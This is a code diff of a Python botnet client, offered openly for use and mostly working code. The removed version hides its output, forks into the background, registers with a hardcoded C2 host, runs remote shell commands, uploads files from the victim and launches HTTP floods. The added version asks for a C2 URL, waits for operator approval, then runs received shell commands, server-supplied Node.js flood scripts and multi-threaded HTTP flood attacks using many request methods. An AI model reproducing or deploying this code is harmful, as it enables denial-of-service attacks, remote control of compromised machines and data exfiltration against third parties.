@@ -1,270 +1,366 @@
-#!/usr/bin/env python3
-import socket,subprocess,time,os,sys,threading,base64,platform
-from urllib.request import urlopen,Request
-from urllib.error import URLError
-import json,uuid,getpass
+"""
+BOTNET CLIENT
+=============
+Run: python client.py
+1. Generates unique ID
+2. Copy ID to server dashboard
+3. Wait for approval
+4. Executes commands
 
-# ============ CONFIGURATION ============
-SERVER = "https://c2-server-io.onrender.com"  # ← CHANGE THIS!
-# =======================================
+Install: pip install requests psutil
+"""
 
-# Silent mode - no output at all
-sys.stdout = open(os.devnull, 'w')
-sys.stderr = open(os.devnull, 'w')
+import threading
+import time
+import sys
+import uuid
+import hashlib
+import subprocess
+import os
+import tempfile
+from datetime import datetime
 
-class Bot:
+try:
+    import psutil
+    import requests
+    requests.packages.urllib3.disable_warnings()
+except ImportError:
+    print("[!] Install dependencies: pip install requests psutil")
+    exit(1)
+
+
+class BotClient:
     def __init__(self):
-        self.id = uuid.uuid4().hex
+        self.bot_id = self.generate_bot_id()
         self.running = True
-        self.process = None
-        self.output_buf = []
-        self.flood_active = False
-        self.flood_threads = []
+        self.server_url = None
+        self.approved = False
         
-        # Get system info silently
-        try:
-            self.host = socket.gethostname()
-        except:
-            self.host = "device"
+        # Detect system specs
+        self.specs = {
+            'cpu_cores': psutil.cpu_count(),
+            'ram_gb': round(psutil.virtual_memory().total / (1024**3), 1),
+            'os': sys.platform
+        }
         
-        try:
-            self.user = getpass.getuser()
-        except:
-            self.user = "user"
+        self.display_banner()
         
-        try:
-            self.cwd = os.getcwd()
-        except:
-            self.cwd = "/"
+    def display_banner(self):
+        """Display bot information"""
+        print("\n╔════════════════════════════════════════════════════════╗")
+        print("║           BOTNET CLIENT - AWAITING APPROVAL            ║")
+        print("╚════════════════════════════════════════════════════════╝")
+        print(f"\n[+] YOUR BOT ID: \x1b[31m\x1b[1m{self.bot_id}\x1b[0m")
+        print(f"[+] System Specs: {self.specs['cpu_cores']} cores, {self.specs['ram_gb']}GB RAM")
+        print(f"[+] OS: {self.specs['os']}")
+        print("\n" + "="*60)
+        print("COPY THIS ID AND ADD IT IN THE SERVER DASHBOARD")
+        print("="*60 + "\n")
         
-        # Generate stealthy name
-        system = platform.system()
-        if system == "Windows":
-            self.name = f"PC-{self.host[:6]}"
-        elif system == "Linux":
-            if os.path.exists("/data/data/com.termux"):
-                self.name = f"Phone-{self.host[:6]}"
-            else:
-                self.name = f"Linux-{self.host[:6]}"
-        elif system == "Darwin":
-            self.name = f"Mac-{self.host[:6]}"
-        else:
-            self.name = f"Device-{self.host[:6]}"
+    def generate_bot_id(self):
+        """Generate unique bot ID based on hardware"""
+        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
+                       for elements in range(0,2*6,2)][::-1])
+        return hashlib.md5(mac.encode()).hexdigest()[:12].upper()
     
-    def req(self, endpoint, data=None):
-        """Make HTTP request"""
-        try:
-            url = SERVER + endpoint
-            if data:
-                data = json.dumps(data).encode('utf-8')
-                req = Request(url, data=data, headers={'Content-Type': 'application/json'})
-            else:
-                req = Request(url)
-            return json.loads(urlopen(req, timeout=5).read())
-        except:
-            return None
+    def get_server_url(self):
+        """Get server URL from user"""
+        print("[?] Enter C2 Server URL:")
+        print("[?] Examples:")
+        print("    - http://localhost:5000")
+        print("    - http://192.168.1.100:5000")
+        print("    - https://your-server.onrender.com")
+        print("[?] Or press ENTER for default (http://localhost:5000): ")
+        url = input("\n>>> ").strip()
+        
+        if not url:
+            url = "http://localhost:5000"
+        
+        return url.rstrip('/')
     
-    def exe(self, cmd):
-        """Execute command silently"""
+    def check_approval(self):
+        """Check if bot is approved"""
         try:
-            # Handle cd command
-            if cmd.strip().startswith('cd '):
-                try:
-                    path = cmd.strip()[3:].strip()
-                    os.chdir(path if path else os.path.expanduser('~'))
-                    self.cwd = os.getcwd()
-                    return f"Changed to: {self.cwd}"
-                except Exception as e:
-                    return f"cd error: {str(e)}"
+            data = {
+                'bot_id': self.bot_id,
+                'specs': self.specs
+            }
+            response = requests.post(
+                f"{self.server_url}/check_approval", 
+                json=data, 
+                timeout=10,
+                verify=False
+            )
+            if response.status_code == 200:
+                result = response.json()
+                return result.get('approved', False)
+        except Exception as e:
+            pass
+        return False
+    
+    def get_commands(self):
+        """Poll for commands"""
+        try:
+            response = requests.get(
+                f"{self.server_url}/commands/{self.bot_id}", 
+                timeout=5,
+                verify=False
+            )
+            if response.status_code == 200:
+                return response.json().get('commands', [])
+        except:
+            pass
+        return []
+    
+    def send_status(self, status, message):
+        """Send status update"""
+        try:
+            data = {
+                'bot_id': self.bot_id,
+                'status': status,
+                'message': message
+            }
+            requests.post(
+                f"{self.server_url}/status", 
+                json=data, 
+                timeout=5,
+                verify=False
+            )
+        except:
+            pass
+    
+    def run_nodejs_script(self, script_content, args):
+        """Run Node.js script"""
+        try:
+            # Create temp file
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
+                f.write(script_content)
+                script_path = f.name
             
-            # Execute command
-            result = subprocess.run(
-                cmd,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=30,
-                cwd=self.cwd
+            # Run node script
+            cmd = ['node', script_path] + args
+            process = subprocess.Popen(
+                cmd, 
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE
             )
             
-            self.cwd = os.getcwd()
-            output = result.stdout if result.stdout else result.stderr
-            return output if output else "Done"
-        except subprocess.TimeoutExpired:
-            return "Timeout"
+            return process, script_path
+            
         except Exception as e:
-            return f"Error: {str(e)}"
+            return None, str(e)
     
-    def upload(self, filepath):
-        """Upload file from bot to server"""
-        try:
-            if not os.path.exists(filepath):
-                return {'status': 'error', 'message': 'File not found'}
+    def execute_command(self, cmd):
+        """Execute command"""
+        cmd_type = cmd.get('type')
+        
+        print(f"\n{'='*60}")
+        print(f"[→] COMMAND RECEIVED: {cmd_type}")
+        print(f"{'='*60}")
+        
+        if cmd_type == 'ping':
+            self.send_status('success', 'pong')
+            print("[✓] Responded to ping")
             
-            with open(filepath, 'rb') as f:
-                data = base64.b64encode(f.read()).decode('utf-8')
+        elif cmd_type == 'nodejs_flood':
+            self.execute_nodejs_flood(cmd)
             
-            return {
-                'status': 'success',
-                'filename': os.path.basename(filepath),
-                'data': data,
-                'size': os.path.getsize(filepath)
-            }
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
+        elif cmd_type == 'http_flood':
+            self.execute_http_flood(cmd)
+            
+        elif cmd_type == 'shell':
+            self.execute_shell(cmd)
     
-    def download(self, filename, file_data):
-        """Download file from server to bot"""
-        try:
-            data = base64.b64decode(file_data)
-            filepath = os.path.join(self.cwd, filename)
+    def execute_nodejs_flood(self, cmd):
+        """Execute Node.js flood script"""
+        script = cmd.get('script')
+        args = cmd.get('args', [])
+        
+        print(f"[*] Running Node.js flood script")
+        print(f"[*] Target: {args[0] if args else 'unknown'}")
+        print(f"[*] Duration: {args[1] if len(args) > 1 else 'unknown'}s")
+        
+        self.send_status('running', f'Node.js flood: {args[0] if args else "unknown"}')
+        
+        process, result = self.run_nodejs_script(script, args)
+        
+        if process:
+            print(f"[+] Attack started (PID: {process.pid})")
             
-            with open(filepath, 'wb') as f:
-                f.write(data)
+            # Let it run
+            duration = int(args[1]) if len(args) > 1 else 60
+            time.sleep(duration + 5)
             
-            return {
-                'status': 'success',
-                'message': f'Saved to: {filepath}',
-                'path': filepath
-            }
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-    
-    def http_flood(self, target, duration, threads_count):
-        """HTTP flood attack"""
-        try:
-            self.flood_active = True
-            end_time = time.time() + duration
-            
-            def flood_worker():
-                from urllib.request import urlopen, Request
-                while self.flood_active and time.time() < end_time:
-                    try:
-                        req = Request(target, headers={
-                            'User-Agent': 'Mozilla/5.0',
-                            'Accept': '*/*'
-                        })
-                        urlopen(req, timeout=3)
-                    except:
-                        pass
-            
-            # Start flood threads
-            for i in range(threads_count):
-                t = threading.Thread(target=flood_worker, daemon=True)
-                t.start()
-                self.flood_threads.append(t)
-            
-            return f"HTTP flood started: {threads_count} threads attacking {target} for {duration}s"
-        except Exception as e:
-            return f"Flood error: {str(e)}"
-    
-    def stop_flood(self):
-        """Stop HTTP flood attack"""
-        self.flood_active = False
-        self.flood_threads = []
-        return "Flood stopped"
-    
-    def connect(self):
-        """Connect to C2"""
-        while True:
+            # Kill process
             try:
-                result = self.req('/register', {
-                    'client_id': self.id,
-                    'name': self.name,
-                    'hostname': self.host,
-                    'username': self.user,
-                    'cwd': self.cwd
-                })
-                if result:
-                    break
+                process.terminate()
+                process.wait(timeout=5)
             except:
-                pass
-            time.sleep(5)
+                process.kill()
+            
+            # Cleanup
+            if isinstance(result, str) and os.path.exists(result):
+                os.unlink(result)
+            
+            self.send_status('success', 'Node.js flood completed')
+            print("[✓] Attack completed successfully")
+        else:
+            self.send_status('error', f'Failed: {result}')
+            print(f"[!] Attack failed: {result}")
+    
+    def execute_http_flood(self, cmd):
+        """Advanced HTTP flood"""
+        target = cmd['target']
+        duration = cmd['duration']
+        threads = cmd.get('threads', 10)
+        method = cmd.get('method', 'GET')
+        post_data = cmd.get('post_data', '')
+        headers = cmd.get('headers', {})
+        
+        print(f"[*] HTTP Flood Attack")
+        print(f"[*] Target: {target}")
+        print(f"[*] Method: {method}")
+        print(f"[*] Duration: {duration}s")
+        print(f"[*] Threads: {threads}")
+        
+        self.send_status('running', f'{method} flood on {target}')
+        
+        def flood():
+            end_time = time.time() + duration
+            count = 0
+            
+            request_kwargs = {
+                'timeout': 5,
+                'allow_redirects': False,
+                'verify': False
+            }
+            
+            if headers:
+                request_kwargs['headers'] = headers
+            
+            if method == 'POST' and post_data:
+                request_kwargs['data'] = post_data
+            
+            while time.time() < end_time:
+                try:
+                    if method == 'GET':
+                        requests.get(target, **request_kwargs)
+                    elif method == 'POST':
+                        requests.post(target, **request_kwargs)
+                    elif method == 'HEAD':
+                        requests.head(target, **request_kwargs)
+                    elif method == 'PUT':
+                        requests.put(target, **request_kwargs)
+                    elif method == 'DELETE':
+                        requests.delete(target, **request_kwargs)
+                    elif method == 'OPTIONS':
+                        requests.options(target, **request_kwargs)
+                    elif method == 'PATCH':
+                        requests.patch(target, **request_kwargs)
+                    else:
+                        requests.get(target, **request_kwargs)
+                    count += 1
+                except:
+                    pass
+            
+            print(f"[+] Thread completed: {count} requests")
+        
+        workers = []
+        for _ in range(threads):
+            t = threading.Thread(target=flood, daemon=True)
+            t.start()
+            workers.append(t)
+        
+        for t in workers:
+            t.join()
+        
+        self.send_status('success', f'{method} flood completed')
+        print(f"[✓] HTTP flood completed")
+    
+    def execute_shell(self, cmd):
+        """Execute shell command"""
+        command = cmd.get('command')
+        
+        print(f"[*] Executing shell command: {command}")
+        
+        try:
+            result = subprocess.check_output(
+                command, 
+                shell=True, 
+                stderr=subprocess.STDOUT, 
+                timeout=30
+            )
+            output = result.decode('utf-8', errors='ignore')
+            self.send_status('success', output[:500])
+            print(f"[+] Command output:\n{output[:500]}")
+        except Exception as e:
+            self.send_status('error', str(e))
+            print(f"[!] Command error: {e}")
     
     def run(self):
-        """Main bot loop"""
-        # Connect silently
-        self.connect()
+        """Main loop"""
+        # Get server URL
+        self.server_url = self.get_server_url()
         
-        hb_counter = 0
+        print(f"\n[*] Connecting to: {self.server_url}")
+        print(f"[*] Waiting for approval...\n")
         
-        # Main loop
+        # Wait for approval
+        dots = 0
+        while not self.approved:
+            try:
+                if self.check_approval():
+                    self.approved = True
+                    print("\n\n" + "="*60)
+                    print("✓ BOT APPROVED! NOW ACTIVE AND RECEIVING COMMANDS")
+                    print("="*60 + "\n")
+                    break
+                else:
+                    dots = (dots + 1) % 4
+                    print(f"[...] Waiting for approval (ID: {self.bot_id})" + "."*dots + " "*10, end='\r')
+                    time.sleep(5)
+                    
+            except KeyboardInterrupt:
+                print("\n[!] Exiting...")
+                return
+            except Exception as e:
+                print(f"\n[!] Connection error: {e}")
+                time.sleep(10)
+        
+        # Main command loop
+        print(f"[+] Bot active. Listening for commands...\n")
+        
         while self.running:
             try:
-                # Poll for commands
-                cmd_data = self.req('/poll', {'client_id': self.id})
+                commands = self.get_commands()
+                for cmd in commands:
+                    threading.Thread(
+                        target=self.execute_command, 
+                        args=(cmd,), 
+                        daemon=True
+                    ).start()
                 
-                if cmd_data and cmd_data.get('command'):
-                    cmd_id = cmd_data['id']
-                    command = cmd_data['command']
-                    cmd_type = cmd_data.get('type', 'execute')
-                    
-                    # Execute based on type
-                    if cmd_type == 'execute':
-                        result = self.exe(command)
-                        result = {'type': 'normal', 'output': result}
-                    elif cmd_type == 'upload':
-                        result = self.upload(command)
-                    elif cmd_type == 'download':
-                        file_data = cmd_data.get('file_data')
-                        result = self.download(command, file_data)
-                    elif cmd_type == 'flood':
-                        # Parse flood command
-                        if command == 'stopflood':
-                            result = {'type': 'normal', 'output': self.stop_flood()}
-                        elif command.startswith('httpflood|'):
-                            parts = command.split('|')
-                            if len(parts) == 4:
-                                target = parts[1]
-                                duration = int(parts[2])
-                                threads = int(parts[3])
-                                result = {'type': 'normal', 'output': self.http_flood(target, duration, threads)}
-                            else:
-                                result = {'type': 'normal', 'output': 'Invalid flood command'}
-                        else:
-                            result = {'type': 'normal', 'output': 'Unknown flood command'}
-                    else:
-                        result = {'type': 'normal', 'output': 'Unknown command type'}
-                    
-                    # Send response
-                    self.req('/response', {
-                        'id': cmd_id,
-                        'result': result,
-                        'cwd': self.cwd,
-                        'client_id': self.id
-                    })
-                
-                # Heartbeat every 10 seconds
-                hb_counter += 1
-                if hb_counter >= 10:
-                    self.req('/heartbeat', {'client_id': self.id})
-                    hb_counter = 0
-                
-                time.sleep(1)
+                time.sleep(5)  # Poll every 5 seconds
                 
             except KeyboardInterrupt:
+                print("\n[!] Stopping bot...")
                 self.running = False
-                break
-            except:
-                time.sleep(5)
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                time.sleep(10)
 
-def main():
-    # Run in background silently
-    try:
-        # Detach from terminal on Unix
-        if os.name != 'nt':
-            try:
-                if os.fork() > 0:
-                    sys.exit(0)
-            except:
-                pass
-        
-        # Start bot
-        bot = Bot()
-        bot.run()
-        
-    except:
-        pass
 
 if __name__ == '__main__':
-    main()
+    print("\n╔════════════════════════════════════════════════════════╗")
+    print("║                  BOTNET CLIENT v1.0                    ║")
+    print("╚════════════════════════════════════════════════════════╝")
+    
+    try:
+        client = BotClient()
+        client.run()
+    except KeyboardInterrupt:
+        print("\n[!] Exiting...")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n[!] Fatal error: {e}")
+        sys.exit(1)
